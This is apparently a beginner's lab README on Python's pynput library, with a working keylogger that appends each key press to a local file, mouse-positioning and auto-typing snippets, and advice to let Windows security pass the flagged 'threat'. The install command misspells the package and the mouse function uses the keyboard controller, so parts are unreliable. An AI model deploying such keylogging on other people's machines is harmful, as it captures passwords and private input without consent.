# Lab & Test 

The Plugin I used for pynput for Python. This pluggin allows you to keylog user inputs at all times, set positions of your mouse and automatically type for you (copy and paste)

First we will install the pluggin
```
pip install pyntput
```
Then in Notepad or Visual Studios import the pluggins
```
from pynput import keyboard
from pynput import mouse
from pynput.keyboard import Controller
```
To Set up Keylogging we will use this code

```
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
            try:
                char = key.char
                logKey.write(char)
            except:
                   print("Error getting Characters") 
if __name__ == "__main__":  
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
```
This code will allow keylogging ,But you will need to go to windows settings to allow this Windows threat to go through to produce a keylog file also.


Secondly, We will create Mouse control in which this code will position your mouse in certain location on your screen

```
def controlMouse():
    mouse = Controller()
    mouse.position = (10,20)

```
Then you these lines to output text on your screen
```
def controlKeyboard():
    keyboard = Controller()
    keyboard.type ("Magic just occurred  ")

controlKeyboard()  


```
